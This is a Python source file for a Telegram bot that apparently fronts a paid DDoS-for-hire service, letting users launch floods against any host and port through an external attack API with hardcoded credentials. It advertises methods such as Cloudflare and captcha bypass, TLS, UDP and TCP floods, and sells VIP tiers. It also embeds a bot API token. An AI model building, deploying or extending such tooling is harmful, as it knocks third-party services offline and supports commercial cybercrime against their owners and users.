import telebot
import json
import time
import requests
from datetime import datetime

API_TOKEN = '7760313406:AAGa3uidHBuAKWWJbMFvKoiO5mufRKVBbeQ'
bot = telebot.TeleBot(API_TOKEN)
ADMIN_IDS = [7933970124]
user_cooldowns = {}

def load_vip_data():
    try:
        with open('vip.json', 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_vip_data(vip_data):
    with open('vip.json', 'w') as f:
        json.dump(vip_data, f, indent=4)

vip_data = load_vip_data()

def is_vip(user_id):
    return str(user_id) in vip_data or user_id in ADMIN_IDS

@bot.message_handler(commands=['help', 'menu'])
def send_help(message):
    bot.reply_to(message, """
<b>Hello Welcome To Ventox BOT</b>

<b>🐝 Free Commands</b>
➥ <code>/plan</code>: <b>View Plan Details</b>
➥ <code>/methods</code>: <b>View List Methods</b>
➥ <code>/attack</code>: <b>Attack Details</b>
➖➖➖➖➖➖➖➖
<b>💔 Admin Commands</b>
➥ <code>/add</code>: <b>Add VIP Plan</b>
➥ <code>/rm</code>: <b>Remove VIP Plan</b>
""", parse_mode="HTML")

@bot.message_handler(commands=['methods'])
def show_methods(message):
    methods_text = """
<b>🍄 Vip Methods</b>
<b> .TLS</b>: <code>TLS Flood only HTTPS</code>
<b> .CLOUDFLARE</b>: <code>HTTPS Bypass reCaptcha/UAM</code>
<b> .HTTP-BROWSER</b>: <code>Browser solve captcha</code>
<b> .HTTP-RAPID</b>: <code>Rapid mixed with flood</code>
<b> .HTTP-BYPASS</b>: <code>Normal Bypass HTTPS</code>
<b> .RAW</b>: <code>Raw high rqs</code>
<b> .UDPBYPASS</b>: <code>Udp bypass strong pw</code>
<b> .TCPBYAPSS</b>: <code>Tcp bypass high gbps</code>
<b> .SOCKET-TCP</b>: <code>Socket high bandwith</code>
<b> .R6-BETA</b>: <code>R6 beta methods low power</code>
➖➖➖➖➖➖➖➖
<b>🦐 Free Methods</b>
<b> .HTTP-XV</b>: <code>Raw power low requests</code>
<b> .HTTPS</b>: <code>HTTPS Flood</code>
<b> .UDP</b>: <code>Udp methods</code>
<b> .HOME</b> <code>Home holder methods</code>
"""
    bot.reply_to(message, methods_text, parse_mode="HTML")

@bot.message_handler(commands=['plan'])
def show_plan(message):
    user_id = message.from_user.id
    username = message.from_user.username
    if is_vip(user_id):
        max_time, max_slot, expiry, blacklist = 300, 30, "300 Day(s)", "False"
    else:
        max_time, max_slot, expiry, blacklist = 45, 1, "30 Day(s)", "True"
    
    plan_text = f"""
<b>Username: [@{username}]</b>
➖➖➖➖➖➖➖➖
<b>Plan Details:</b>
<b> VIP</b>: [<code>{'True' if is_vip(user_id) else 'False'}</code>]
<b> Max Time</b>: [<code>{max_time}</code>]
<b> Max Slot</b>: [<code>{max_slot}</code>]
<b> Expiry</b>: [<code>{expiry}</code>]
<b> Blacklist</b>: [<code>{blacklist}</code>]
"""
    bot.reply_to(message, plan_text, parse_mode="HTML")

@bot.message_handler(commands=['attack'])
def attack_command(message):
    args = message.text.split()
    if len(args) < 5:
        bot.reply_to(message, "<b>Usage: /attack (Host) (Port) (Time) (Methods)</b>", parse_mode="HTML")
        return

    host, port, attack_time, method = args[1], args[2], int(args[3]), args[4]
    user_id = message.from_user.id
    username = message.from_user.username

    allowed_methods = [".browser"]
    if is_vip(user_id):
        allowed_methods += [".tls-kill", ".ovh-killer"]

    if method not in allowed_methods:
        bot.reply_to(message, "<b>🐓 You Do Not Have Permission To Use This Method.\nBuy Vip Plan Methods Ibox @henrynet206</b>", parse_mode="HTML")
        return

    if user_id in user_cooldowns:
        last_attack_time = user_cooldowns[user_id]['last_attack']
        cooldown = user_cooldowns[user_id]['cooldown']
        time_remaining = cooldown - (time.time() - last_attack_time)
        if time_remaining > 0:
            bot.reply_to(message, f"<b>Cooldown Pls Wait [{int(time_remaining)}]</b>", parse_mode="HTML")
            return

    if user_id in vip_data:
        max_time = vip_data[str(user_id)]['maxtime']
        cooldown = vip_data[str(user_id)]['cooldown']
    elif user_id in ADMIN_IDS:
        max_time, cooldown = 300, 10
    else:
        max_time, cooldown = 60, 120

    if attack_time > max_time:
        bot.reply_to(message, f"<b>Max Time is [{max_time}]</b>", parse_mode="HTML")
        return

    api_url = f"http://www.arthurc2.xyz:5555/api/attack?username=yui&secret=123123&host={host}&time={time}&port={port}&method={method}"
    response = requests.get(api_url)
    json_response = response.json()

    bot.reply_to(
        message,
        f"<pre>{json.dumps(json_response, indent=4)}</pre>\n\n<b>🎀 Attack By: @{username}</b>",
        parse_mode="HTML"
    )
    user_cooldowns[user_id] = {'last_attack': time.time(), 'cooldown': cooldown}

@bot.message_handler(commands=['add'])
def add_vip(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "<b>💔 You Do Not Have Permission to Use This Command</b>", parse_mode="HTML")
        return

    args = message.text.split()
    if len(args) < 6:
        bot.reply_to(message, "<b>Usage: /add (ID) (Conc) (MaxTime) (Cooldown) (Expiry)</b>", parse_mode="HTML")
        return

    user_id, maxconc, maxtime, cooldown, expiry = args[1], int(args[2]), int(args[3]), int(args[4]), int(args[5])
    vip_data[user_id] = {
        "maxconc": maxconc,
        "maxtime": maxtime,
        "cooldown": cooldown,
        "expiry": expiry
    }
    save_vip_data(vip_data)
    bot.reply_to(message, f"<b>🎀 Added VIP Plan For User [{user_id}] | Max Slot: {maxconc} | MaxTime: {maxtime} | Cooldown: {cooldown} | Expiry: {expiry} Day(s)</b>", parse_mode="HTML")

@bot.message_handler(commands=['rm'])
def remove_vip(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "<b>💔 You Do Not Have Permission to Use This Command</b>", parse_mode="HTML")
        return

    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "<b>Usage: /rm (ID)</b>>", parse_mode="HTML")
        return

    user_id = args[1]
    if user_id in vip_data:
        del vip_data[user_id]
        save_vip_data(vip_data)
        bot.reply_to(message, f"<b>Removed VIP Plan For User [{user_id}]</b>", parse_mode="HTML")
    else:
        bot.reply_to(message, f"<b>No VIP Plan Found For User [{user_id}]</b>", parse_mode="HTML")

bot.polling()
